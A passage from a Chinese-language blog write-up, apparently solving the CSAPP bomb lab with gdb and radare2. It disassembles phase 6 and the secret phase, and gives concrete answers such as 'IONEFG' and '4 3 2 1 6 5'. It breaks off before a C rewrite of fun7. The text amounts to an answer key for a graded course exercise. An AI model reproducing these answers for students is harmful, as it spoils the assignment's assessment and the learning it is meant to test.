<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[0x00401062]&gt; !rax2 -S flyers</div><div class="line">666c79657273</div></pre></td></tr></table></figure>
<p>得到的<code>666c79657273</code>两个一组，找对应的上面的偏移量，可以得到偏移量list<code>[9, 0xF, 0xE, 5, 6, 7]</code></p>
<p>使用python来计算出结果</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">off = [<span class="number">9</span>, <span class="number">0xF</span>, <span class="number">0xE</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</div><div class="line">result = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> off:</div><div class="line">    result += chr(c + <span class="number">64</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure>
<p>所以这题的答案是<code>IONEFG</code></p>
<h2 id="Phase6"><a href="#Phase6" class="headerlink" title="Phase6"></a>Phase6</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div></pre></td><td class="code"><pre><div class="line">bomb`phase_6:</div><div class="line">bomb[0x4010f4] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:   pushq  %r14</div><div class="line">bomb[0x4010f6] <span class="tag">&lt;<span class="name">+2</span>&gt;</span>:   pushq  %r13</div><div class="line">bomb[0x4010f8] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:   pushq  %r12</div><div class="line">bomb[0x4010fa] <span class="tag">&lt;<span class="name">+6</span>&gt;</span>:   pushq  %rbp</div><div class="line">bomb[0x4010fb] <span class="tag">&lt;<span class="name">+7</span>&gt;</span>:   pushq  %rbx</div><div class="line">bomb[0x4010fc] <span class="tag">&lt;<span class="name">+8</span>&gt;</span>:   subq   $0x50, %rsp</div><div class="line">bomb[0x401100] <span class="tag">&lt;<span class="name">+12</span>&gt;</span>:  movq   %rsp, %r13</div><div class="line">bomb[0x401103] <span class="tag">&lt;<span class="name">+15</span>&gt;</span>:  movq   %rsp, %rsi</div><div class="line">bomb[0x401106] <span class="tag">&lt;<span class="name">+18</span>&gt;</span>:  callq  0x40145c                  ; read_six_numbers</div><div class="line">bomb[0x40110b] <span class="tag">&lt;<span class="name">+23</span>&gt;</span>:  movq   %rsp, %r14</div><div class="line">bomb[0x40110e] <span class="tag">&lt;<span class="name">+26</span>&gt;</span>:  movl   $0x0, %r12d</div><div class="line">bomb[0x401114] <span class="tag">&lt;<span class="name">+32</span>&gt;</span>:  movq   %r13, %rbp</div><div class="line">bomb[0x401117] <span class="tag">&lt;<span class="name">+35</span>&gt;</span>:  movl   (%r13), %eax</div><div class="line">bomb[0x40111b] <span class="tag">&lt;<span class="name">+39</span>&gt;</span>:  subl   $0x1, %eax</div><div class="line">bomb[0x40111e] <span class="tag">&lt;<span class="name">+42</span>&gt;</span>:  cmpl   $0x5, %eax</div><div class="line">bomb[0x401121] <span class="tag">&lt;<span class="name">+45</span>&gt;</span>:  jbe    0x401128                  ; <span class="tag">&lt;<span class="name">+52</span>&gt;</span></div><div class="line">bomb[0x401123] <span class="tag">&lt;<span class="name">+47</span>&gt;</span>:  callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x401128] <span class="tag">&lt;<span class="name">+52</span>&gt;</span>:  addl   $0x1, %r12d</div><div class="line">bomb[0x40112c] <span class="tag">&lt;<span class="name">+56</span>&gt;</span>:  cmpl   $0x6, %r12d</div><div class="line">bomb[0x401130] <span class="tag">&lt;<span class="name">+60</span>&gt;</span>:  je     0x401153                  ; <span class="tag">&lt;<span class="name">+95</span>&gt;</span></div><div class="line">bomb[0x401132] <span class="tag">&lt;<span class="name">+62</span>&gt;</span>:  movl   %r12d, %ebx</div><div class="line">bomb[0x401135] <span class="tag">&lt;<span class="name">+65</span>&gt;</span>:  movslq %ebx, %rax</div><div class="line">bomb[0x401138] <span class="tag">&lt;<span class="name">+68</span>&gt;</span>:  movl   (%rsp,%rax,4), %eax</div><div class="line">bomb[0x40113b] <span class="tag">&lt;<span class="name">+71</span>&gt;</span>:  cmpl   %eax, (%rbp)</div><div class="line">bomb[0x40113e] <span class="tag">&lt;<span class="name">+74</span>&gt;</span>:  jne    0x401145                  ; <span class="tag">&lt;<span class="name">+81</span>&gt;</span></div><div class="line">bomb[0x401140] <span class="tag">&lt;<span class="name">+76</span>&gt;</span>:  callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x401145] <span class="tag">&lt;<span class="name">+81</span>&gt;</span>:  addl   $0x1, %ebx</div><div class="line">bomb[0x401148] <span class="tag">&lt;<span class="name">+84</span>&gt;</span>:  cmpl   $0x5, %ebx</div><div class="line">bomb[0x40114b] <span class="tag">&lt;<span class="name">+87</span>&gt;</span>:  jle    0x401135                  ; <span class="tag">&lt;<span class="name">+65</span>&gt;</span></div><div class="line">bomb[0x40114d] <span class="tag">&lt;<span class="name">+89</span>&gt;</span>:  addq   $0x4, %r13</div><div class="line">bomb[0x401151] <span class="tag">&lt;<span class="name">+93</span>&gt;</span>:  jmp    0x401114                  ; <span class="tag">&lt;<span class="name">+32</span>&gt;</span></div><div class="line">bomb[0x401153] <span class="tag">&lt;<span class="name">+95</span>&gt;</span>:  leaq   0x18(%rsp), %rsi</div><div class="line">bomb[0x401158] <span class="tag">&lt;<span class="name">+100</span>&gt;</span>: movq   %r14, %rax</div><div class="line">bomb[0x40115b] <span class="tag">&lt;<span class="name">+103</span>&gt;</span>: movl   $0x7, %ecx</div><div class="line">bomb[0x401160] <span class="tag">&lt;<span class="name">+108</span>&gt;</span>: movl   %ecx, %edx</div><div class="line">bomb[0x401162] <span class="tag">&lt;<span class="name">+110</span>&gt;</span>: subl   (%rax), %edx</div><div class="line">bomb[0x401164] <span class="tag">&lt;<span class="name">+112</span>&gt;</span>: movl   %edx, (%rax)</div><div class="line">bomb[0x401166] <span class="tag">&lt;<span class="name">+114</span>&gt;</span>: addq   $0x4, %rax</div><div class="line">bomb[0x40116a] <span class="tag">&lt;<span class="name">+118</span>&gt;</span>: cmpq   %rsi, %rax</div><div class="line">bomb[0x40116d] <span class="tag">&lt;<span class="name">+121</span>&gt;</span>: jne    0x401160                  ; <span class="tag">&lt;<span class="name">+108</span>&gt;</span></div><div class="line">bomb[0x40116f] <span class="tag">&lt;<span class="name">+123</span>&gt;</span>: movl   $0x0, %esi</div><div class="line">bomb[0x401174] <span class="tag">&lt;<span class="name">+128</span>&gt;</span>: jmp    0x401197                  ; <span class="tag">&lt;<span class="name">+163</span>&gt;</span></div><div class="line">bomb[0x401176] <span class="tag">&lt;<span class="name">+130</span>&gt;</span>: movq   0x8(%rdx), %rdx</div><div class="line">bomb[0x40117a] <span class="tag">&lt;<span class="name">+134</span>&gt;</span>: addl   $0x1, %eax</div><div class="line">bomb[0x40117d] <span class="tag">&lt;<span class="name">+137</span>&gt;</span>: cmpl   %ecx, %eax</div><div class="line">bomb[0x40117f] <span class="tag">&lt;<span class="name">+139</span>&gt;</span>: jne    0x401176                  ; <span class="tag">&lt;<span class="name">+130</span>&gt;</span></div><div class="line">bomb[0x401181] <span class="tag">&lt;<span class="name">+141</span>&gt;</span>: jmp    0x401188                  ; <span class="tag">&lt;<span class="name">+148</span>&gt;</span></div><div class="line">bomb[0x401183] <span class="tag">&lt;<span class="name">+143</span>&gt;</span>: movl   $0x6032d0, %edx</div><div class="line">bomb[0x401188] <span class="tag">&lt;<span class="name">+148</span>&gt;</span>: movq   %rdx, 0x20(%rsp,%rsi,2)</div><div class="line">bomb[0x40118d] <span class="tag">&lt;<span class="name">+153</span>&gt;</span>: addq   $0x4, %rsi</div><div class="line">bomb[0x401191] <span class="tag">&lt;<span class="name">+157</span>&gt;</span>: cmpq   $0x18, %rsi</div><div class="line">bomb[0x401195] <span class="tag">&lt;<span class="name">+161</span>&gt;</span>: je     0x4011ab                  ; <span class="tag">&lt;<span class="name">+183</span>&gt;</span></div><div class="line">bomb[0x401197] <span class="tag">&lt;<span class="name">+163</span>&gt;</span>: movl   (%rsp,%rsi), %ecx</div><div class="line">bomb[0x40119a] <span class="tag">&lt;<span class="name">+166</span>&gt;</span>: cmpl   $0x1, %ecx</div><div class="line">bomb[0x40119d] <span class="tag">&lt;<span class="name">+169</span>&gt;</span>: jle    0x401183                  ; <span class="tag">&lt;<span class="name">+143</span>&gt;</span></div><div class="line">bomb[0x40119f] <span class="tag">&lt;<span class="name">+171</span>&gt;</span>: movl   $0x1, %eax</div><div class="line">bomb[0x4011a4] <span class="tag">&lt;<span class="name">+176</span>&gt;</span>: movl   $0x6032d0, %edx</div><div class="line">bomb[0x4011a9] <span class="tag">&lt;<span class="name">+181</span>&gt;</span>: jmp    0x401176                  ; <span class="tag">&lt;<span class="name">+130</span>&gt;</span></div><div class="line">bomb[0x4011ab] <span class="tag">&lt;<span class="name">+183</span>&gt;</span>: movq   0x20(%rsp), %rbx</div><div class="line">bomb[0x4011b0] <span class="tag">&lt;<span class="name">+188</span>&gt;</span>: leaq   0x28(%rsp), %rax</div><div class="line">bomb[0x4011b5] <span class="tag">&lt;<span class="name">+193</span>&gt;</span>: leaq   0x50(%rsp), %rsi</div><div class="line">bomb[0x4011ba] <span class="tag">&lt;<span class="name">+198</span>&gt;</span>: movq   %rbx, %rcx</div><div class="line">bomb[0x4011bd] <span class="tag">&lt;<span class="name">+201</span>&gt;</span>: movq   (%rax), %rdx</div><div class="line">bomb[0x4011c0] <span class="tag">&lt;<span class="name">+204</span>&gt;</span>: movq   %rdx, 0x8(%rcx)</div><div class="line">bomb[0x4011c4] <span class="tag">&lt;<span class="name">+208</span>&gt;</span>: addq   $0x8, %rax</div><div class="line">bomb[0x4011c8] <span class="tag">&lt;<span class="name">+212</span>&gt;</span>: cmpq   %rsi, %rax</div><div class="line">bomb[0x4011cb] <span class="tag">&lt;<span class="name">+215</span>&gt;</span>: je     0x4011d2                  ; <span class="tag">&lt;<span class="name">+222</span>&gt;</span></div><div class="line">bomb[0x4011cd] <span class="tag">&lt;<span class="name">+217</span>&gt;</span>: movq   %rdx, %rcx</div><div class="line">bomb[0x4011d0] <span class="tag">&lt;<span class="name">+220</span>&gt;</span>: jmp    0x4011bd                  ; <span class="tag">&lt;<span class="name">+201</span>&gt;</span></div><div class="line">bomb[0x4011d2] <span class="tag">&lt;<span class="name">+222</span>&gt;</span>: movq   $0x0, 0x8(%rdx)</div><div class="line">bomb[0x4011da] <span class="tag">&lt;<span class="name">+230</span>&gt;</span>: movl   $0x5, %ebp</div><div class="line">bomb[0x4011df] <span class="tag">&lt;<span class="name">+235</span>&gt;</span>: movq   0x8(%rbx), %rax</div><div class="line">bomb[0x4011e3] <span class="tag">&lt;<span class="name">+239</span>&gt;</span>: movl   (%rax), %eax</div><div class="line">bomb[0x4011e5] <span class="tag">&lt;<span class="name">+241</span>&gt;</span>: cmpl   %eax, (%rbx)</div><div class="line">bomb[0x4011e7] <span class="tag">&lt;<span class="name">+243</span>&gt;</span>: jge    0x4011ee                  ; <span class="tag">&lt;<span class="name">+250</span>&gt;</span></div><div class="line">bomb[0x4011e9] <span class="tag">&lt;<span class="name">+245</span>&gt;</span>: callq  0x40143a                  ; explode_bomb</div><div class="line">bomb[0x4011ee] <span class="tag">&lt;<span class="name">+250</span>&gt;</span>: movq   0x8(%rbx), %rbx</div><div class="line">bomb[0x4011f2] <span class="tag">&lt;<span class="name">+254</span>&gt;</span>: subl   $0x1, %ebp</div><div class="line">bomb[0x4011f5] <span class="tag">&lt;<span class="name">+257</span>&gt;</span>: jne    0x4011df                  ; <span class="tag">&lt;<span class="name">+235</span>&gt;</span></div><div class="line">bomb[0x4011f7] <span class="tag">&lt;<span class="name">+259</span>&gt;</span>: addq   $0x50, %rsp</div><div class="line">bomb[0x4011fb] <span class="tag">&lt;<span class="name">+263</span>&gt;</span>: popq   %rbx</div><div class="line">bomb[0x4011fc] <span class="tag">&lt;<span class="name">+264</span>&gt;</span>: popq   %rbp</div><div class="line">bomb[0x4011fd] <span class="tag">&lt;<span class="name">+265</span>&gt;</span>: popq   %r12</div><div class="line">bomb[0x4011ff] <span class="tag">&lt;<span class="name">+267</span>&gt;</span>: popq   %r13</div><div class="line">bomb[0x401201] <span class="tag">&lt;<span class="name">+269</span>&gt;</span>: popq   %r14</div><div class="line">bomb[0x401203] <span class="tag">&lt;<span class="name">+271</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>代码虽然很长，其实使用<code>stepi</code>还是挺容易弄懂的。首先读取6个数字，并且各不相同。然后，在<code>0x6032d0</code>位置有一个链表，读取这链表的值。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(gdb)x/32wx 0x6032d0</div></pre></td></tr></table></figure>
<p>当然使用radare2很容易发现这里的链表，</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[0x004010f4]&gt; pxw 96@obj.node1</div><div class="line">0x006032d0  0x0000014c 0x00000001 0x006032e0 0x00000000  L........2`.....</div><div class="line">0x006032e0  0x000000a8 0x00000002 0x006032f0 0x00000000  .........2`.....</div><div class="line">0x006032f0  0x0000039c 0x00000003 0x00603300 0x00000000  .........3`.....</div><div class="line">0x00603300  0x000002b3 0x00000004 0x00603310 0x00000000  .........3`.....</div><div class="line">0x00603310  0x000001dd 0x00000005 0x00603320 0x00000000  ........ 3`.....</div><div class="line">0x00603320  0x000001bb 0x00000006 0x00000000 0x00000000  ................</div></pre></td></tr></table></figure>
<p>另外，对于读入的数，这里存在一个操作</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bomb[0x40115b] <span class="tag">&lt;<span class="name">+103</span>&gt;</span>: movl   $0x7, %ecx</div><div class="line">bomb[0x401160] <span class="tag">&lt;<span class="name">+108</span>&gt;</span>: movl   %ecx, %edx</div><div class="line">bomb[0x401162] <span class="tag">&lt;<span class="name">+110</span>&gt;</span>: subl   (%rax), %edx</div></pre></td></tr></table></figure>
<p>是的，用7来减每个数并保存。</p>
<p>在这个地方</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bomb[0x4011e5] <span class="tag">&lt;<span class="name">+241</span>&gt;</span>: cmpl   %eax, (%rbx)</div><div class="line">bomb[0x4011e7] <span class="tag">&lt;<span class="name">+243</span>&gt;</span>: jge    0x4011ee                  ; <span class="tag">&lt;<span class="name">+250</span>&gt;</span></div></pre></td></tr></table></figure>
<p>这里暗示节点顺序需要时递减。</p>
<p>所以节点重排应该是<code>3 4 5 6 1 2</code>,考虑之前的7减操作，最终的答案是<code>4 3 2 1 6 5</code></p>
<h2 id="Secret_phase"><a href="#Secret_phase" class="headerlink" title="Secret phase"></a>Secret phase</h2><p>这时候说Congratulations!还稍微早了些，这个还暗藏了一个秘密关卡，藏在了phase_defused中。</p>
<p>首先要在phase_defused函数打断点， 另外反汇编出<code>phase_defused</code>，可以发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function phase_defused:</div><div class="line">   0x00000000004015c4 <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:	sub    $0x78,%rsp</div><div class="line">   0x00000000004015c8 <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:	mov    %fs:0x28,%rax</div><div class="line">   0x00000000004015d1 <span class="tag">&lt;<span class="name">+13</span>&gt;</span>:	mov    %rax,0x68(%rsp)</div><div class="line">   0x00000000004015d6 <span class="tag">&lt;<span class="name">+18</span>&gt;</span>:	xor    %eax,%eax</div><div class="line">   0x00000000004015d8 <span class="tag">&lt;<span class="name">+20</span>&gt;</span>:	cmpl   $0x6,0x202181(%rip)        # 0x603760 <span class="tag">&lt;<span class="name">num_input_strings</span>&gt;</span></div><div class="line">   0x00000000004015df <span class="tag">&lt;<span class="name">+27</span>&gt;</span>:	jne    0x40163f <span class="tag">&lt;<span class="name">phase_defused+123</span>&gt;</span></div><div class="line">   0x00000000004015e1 <span class="tag">&lt;<span class="name">+29</span>&gt;</span>:	lea    0x10(%rsp),%r8</div><div class="line">   0x00000000004015e6 <span class="tag">&lt;<span class="name">+34</span>&gt;</span>:	lea    0xc(%rsp),%rcx</div><div class="line">   0x00000000004015eb <span class="tag">&lt;<span class="name">+39</span>&gt;</span>:	lea    0x8(%rsp),%rdx</div><div class="line">   0x00000000004015f0 <span class="tag">&lt;<span class="name">+44</span>&gt;</span>:	mov    $0x402619,%esi</div><div class="line">   0x00000000004015f5 <span class="tag">&lt;<span class="name">+49</span>&gt;</span>:	mov    $0x603870,%edi</div><div class="line">   0x00000000004015fa <span class="tag">&lt;<span class="name">+54</span>&gt;</span>:	callq  0x400bf0 <span class="tag">&lt;<span class="name">__isoc99_sscanf@plt</span>&gt;</span></div><div class="line">   0x00000000004015ff <span class="tag">&lt;<span class="name">+59</span>&gt;</span>:	cmp    $0x3,%eax</div><div class="line">   0x0000000000401602 <span class="tag">&lt;<span class="name">+62</span>&gt;</span>:	jne    0x401635 <span class="tag">&lt;<span class="name">phase_defused+113</span>&gt;</span></div><div class="line">   0x0000000000401604 <span class="tag">&lt;<span class="name">+64</span>&gt;</span>:	mov    $0x402622,%esi</div><div class="line">   0x0000000000401609 <span class="tag">&lt;<span class="name">+69</span>&gt;</span>:	lea    0x10(%rsp),%rdi</div><div class="line">   0x000000000040160e <span class="tag">&lt;<span class="name">+74</span>&gt;</span>:	callq  0x401338 <span class="tag">&lt;<span class="name">strings_not_equal</span>&gt;</span></div><div class="line">   0x0000000000401613 <span class="tag">&lt;<span class="name">+79</span>&gt;</span>:	test   %eax,%eax</div><div class="line">   0x0000000000401615 <span class="tag">&lt;<span class="name">+81</span>&gt;</span>:	jne    0x401635 <span class="tag">&lt;<span class="name">phase_defused+113</span>&gt;</span></div><div class="line">   0x0000000000401617 <span class="tag">&lt;<span class="name">+83</span>&gt;</span>:	mov    $0x4024f8,%edi</div><div class="line">   0x000000000040161c <span class="tag">&lt;<span class="name">+88</span>&gt;</span>:	callq  0x400b10 <span class="tag">&lt;<span class="name">puts@plt</span>&gt;</span></div><div class="line">   0x0000000000401621 <span class="tag">&lt;<span class="name">+93</span>&gt;</span>:	mov    $0x402520,%edi</div><div class="line">   0x0000000000401626 <span class="tag">&lt;<span class="name">+98</span>&gt;</span>:	callq  0x400b10 <span class="tag">&lt;<span class="name">puts@plt</span>&gt;</span></div><div class="line">   0x000000000040162b <span class="tag">&lt;<span class="name">+103</span>&gt;</span>:	mov    $0x0,%eax</div><div class="line">   0x0000000000401630 <span class="tag">&lt;<span class="name">+108</span>&gt;</span>:	callq  0x401242 <span class="tag">&lt;<span class="name">secret_phase</span>&gt;</span></div><div class="line">   0x0000000000401635 <span class="tag">&lt;<span class="name">+113</span>&gt;</span>:	mov    $0x402558,%edi</div><div class="line">   0x000000000040163a <span class="tag">&lt;<span class="name">+118</span>&gt;</span>:	callq  0x400b10 <span class="tag">&lt;<span class="name">puts@plt</span>&gt;</span></div><div class="line">   0x000000000040163f <span class="tag">&lt;<span class="name">+123</span>&gt;</span>:	mov    0x68(%rsp),%rax</div><div class="line">   0x0000000000401644 <span class="tag">&lt;<span class="name">+128</span>&gt;</span>:	xor    %fs:0x28,%rax</div><div class="line">   0x000000000040164d <span class="tag">&lt;<span class="name">+137</span>&gt;</span>:	je     0x401654 <span class="tag">&lt;<span class="name">phase_defused+144</span>&gt;</span></div><div class="line">   0x000000000040164f <span class="tag">&lt;<span class="name">+139</span>&gt;</span>:	callq  0x400b30 <span class="tag">&lt;<span class="name">__stack_chk_fail@plt</span>&gt;</span></div><div class="line">   0x0000000000401654 <span class="tag">&lt;<span class="name">+144</span>&gt;</span>:	add    $0x78,%rsp</div><div class="line">   0x0000000000401658 <span class="tag">&lt;<span class="name">+148</span>&gt;</span>:	retq</div></pre></td></tr></table></figure>
<p>其中<code>secret_phase</code>的源码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function secret_phase:</div><div class="line">=&gt; 0x0000000000401242 <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:	push   %rbx</div><div class="line">   0x0000000000401243 <span class="tag">&lt;<span class="name">+1</span>&gt;</span>:	callq  0x40149e <span class="tag">&lt;<span class="name">read_line</span>&gt;</span></div><div class="line">   0x0000000000401248 <span class="tag">&lt;<span class="name">+6</span>&gt;</span>:	mov    $0xa,%edx</div><div class="line">   0x000000000040124d <span class="tag">&lt;<span class="name">+11</span>&gt;</span>:	mov    $0x0,%esi</div><div class="line">   0x0000000000401252 <span class="tag">&lt;<span class="name">+16</span>&gt;</span>:	mov    %rax,%rdi</div><div class="line">   0x0000000000401255 <span class="tag">&lt;<span class="name">+19</span>&gt;</span>:	callq  0x400bd0 <span class="tag">&lt;<span class="name">strtol@plt</span>&gt;</span></div><div class="line">   0x000000000040125a <span class="tag">&lt;<span class="name">+24</span>&gt;</span>:	mov    %rax,%rbx</div><div class="line">   0x000000000040125d <span class="tag">&lt;<span class="name">+27</span>&gt;</span>:	lea    -0x1(%rax),%eax</div><div class="line">   0x0000000000401260 <span class="tag">&lt;<span class="name">+30</span>&gt;</span>:	cmp    $0x3e8,%eax</div><div class="line">   0x0000000000401265 <span class="tag">&lt;<span class="name">+35</span>&gt;</span>:	jbe    0x40126c <span class="tag">&lt;<span class="name">secret_phase+42</span>&gt;</span></div><div class="line">   0x0000000000401267 <span class="tag">&lt;<span class="name">+37</span>&gt;</span>:	callq  0x40143a <span class="tag">&lt;<span class="name">explode_bomb</span>&gt;</span></div><div class="line">   0x000000000040126c <span class="tag">&lt;<span class="name">+42</span>&gt;</span>:	mov    %ebx,%esi</div><div class="line">   0x000000000040126e <span class="tag">&lt;<span class="name">+44</span>&gt;</span>:	mov    $0x6030f0,%edi</div><div class="line">   0x0000000000401273 <span class="tag">&lt;<span class="name">+49</span>&gt;</span>:	callq  0x401204 <span class="tag">&lt;<span class="name">fun7</span>&gt;</span></div><div class="line">   0x0000000000401278 <span class="tag">&lt;<span class="name">+54</span>&gt;</span>:	cmp    $0x2,%eax</div><div class="line">   0x000000000040127b <span class="tag">&lt;<span class="name">+57</span>&gt;</span>:	je     0x401282 <span class="tag">&lt;<span class="name">secret_phase+64</span>&gt;</span></div><div class="line">   0x000000000040127d <span class="tag">&lt;<span class="name">+59</span>&gt;</span>:	callq  0x40143a <span class="tag">&lt;<span class="name">explode_bomb</span>&gt;</span></div><div class="line">   0x0000000000401282 <span class="tag">&lt;<span class="name">+64</span>&gt;</span>:	mov    $0x402438,%edi</div><div class="line">   0x0000000000401287 <span class="tag">&lt;<span class="name">+69</span>&gt;</span>:	callq  0x400b10 <span class="tag">&lt;<span class="name">puts@plt</span>&gt;</span></div><div class="line">   0x000000000040128c <span class="tag">&lt;<span class="name">+74</span>&gt;</span>:	callq  0x4015c4 <span class="tag">&lt;<span class="name">phase_defused</span>&gt;</span></div><div class="line">   0x0000000000401291 <span class="tag">&lt;<span class="name">+79</span>&gt;</span>:	pop    %rbx</div><div class="line">   0x0000000000401292 <span class="tag">&lt;<span class="name">+80</span>&gt;</span>:	retq</div></pre></td></tr></table></figure>
<p>其中，<code>fun7</code>的返回值和2进行了比较，相等则正确，所以可以确定<code>fun7</code>一定要返回2。跳转到<code>fun7</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">bomb`fun7:</div><div class="line">bomb[0x401204] <span class="tag">&lt;<span class="name">+0</span>&gt;</span>:  subq   $0x8, %rsp</div><div class="line">bomb[0x401208] <span class="tag">&lt;<span class="name">+4</span>&gt;</span>:  testq  %rdi, %rdi</div><div class="line">bomb[0x40120b] <span class="tag">&lt;<span class="name">+7</span>&gt;</span>:  je     0x401238                  ; <span class="tag">&lt;<span class="name">+52</span>&gt;</span></div><div class="line">bomb[0x40120d] <span class="tag">&lt;<span class="name">+9</span>&gt;</span>:  movl   (%rdi), %edx</div><div class="line">bomb[0x40120f] <span class="tag">&lt;<span class="name">+11</span>&gt;</span>: cmpl   %esi, %edx</div><div class="line">bomb[0x401211] <span class="tag">&lt;<span class="name">+13</span>&gt;</span>: jle    0x401220                  ; <span class="tag">&lt;<span class="name">+28</span>&gt;</span></div><div class="line">bomb[0x401213] <span class="tag">&lt;<span class="name">+15</span>&gt;</span>: movq   0x8(%rdi), %rdi</div><div class="line">bomb[0x401217] <span class="tag">&lt;<span class="name">+19</span>&gt;</span>: callq  0x401204                  ; <span class="tag">&lt;<span class="name">+0</span>&gt;</span></div><div class="line">bomb[0x40121c] <span class="tag">&lt;<span class="name">+24</span>&gt;</span>: addl   %eax, %eax</div><div class="line">bomb[0x40121e] <span class="tag">&lt;<span class="name">+26</span>&gt;</span>: jmp    0x40123d                  ; <span class="tag">&lt;<span class="name">+57</span>&gt;</span></div><div class="line">bomb[0x401220] <span class="tag">&lt;<span class="name">+28</span>&gt;</span>: movl   $0x0, %eax</div><div class="line">bomb[0x401225] <span class="tag">&lt;<span class="name">+33</span>&gt;</span>: cmpl   %esi, %edx</div><div class="line">bomb[0x401227] <span class="tag">&lt;<span class="name">+35</span>&gt;</span>: je     0x40123d                  ; <span class="tag">&lt;<span class="name">+57</span>&gt;</span></div><div class="line">bomb[0x401229] <span class="tag">&lt;<span class="name">+37</span>&gt;</span>: movq   0x10(%rdi), %rdi</div><div class="line">bomb[0x40122d] <span class="tag">&lt;<span class="name">+41</span>&gt;</span>: callq  0x401204                  ; <span class="tag">&lt;<span class="name">+0</span>&gt;</span></div><div class="line">bomb[0x401232] <span class="tag">&lt;<span class="name">+46</span>&gt;</span>: leal   0x1(%rax,%rax), %eax</div><div class="line">bomb[0x401236] <span class="tag">&lt;<span class="name">+50</span>&gt;</span>: jmp    0x40123d                  ; <span class="tag">&lt;<span class="name">+57</span>&gt;</span></div><div class="line">bomb[0x401238] <span class="tag">&lt;<span class="name">+52</span>&gt;</span>: movl   $0xffffffff, %eax</div><div class="line">bomb[0x40123d] <span class="tag">&lt;<span class="name">+57</span>&gt;</span>: addq   $0x8, %rsp</div><div class="line">bomb[0x401241] <span class="tag">&lt;<span class="name">+61</span>&gt;</span>: retq</div></pre></td></tr></table></figure>
<p>可以根据上面的代码，写出C语言的递归函数:</p>
